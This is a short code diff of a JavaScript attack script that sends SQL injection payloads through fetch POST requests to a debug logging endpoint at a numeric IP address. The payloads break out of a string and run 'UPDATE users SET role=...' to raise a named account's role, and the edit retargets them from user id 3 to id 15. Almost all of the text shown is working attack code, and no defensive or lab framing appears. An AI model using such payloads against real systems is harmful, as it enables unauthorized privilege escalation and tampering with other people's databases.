@@ -14,7 +14,7 @@
         // This will update user ID 3 (ponypony) from 'demo' to 'user' role
 
         // Option 1: Target by ID
-        const payload1 = "');UPDATE users SET role='user' WHERE id=3;/*";
+        const payload1 = "');UPDATE users SET role='user' WHERE id=15;/*";
 
         fetch('http://91.107.176.228:3000/debug/create_log', {
             method: 'POST',
@@ -60,7 +60,7 @@
             });
 
         // Option 3: Shorter payload to fit constraints better
-        const payload3 = "');UPDATE users SET role='user' WHERE id=3;";
+        const payload3 = "');UPDATE users SET role='user' WHERE id=15;";
 
         fetch('http://91.107.176.228:3000/debug/create_log', {
             method: 'POST',
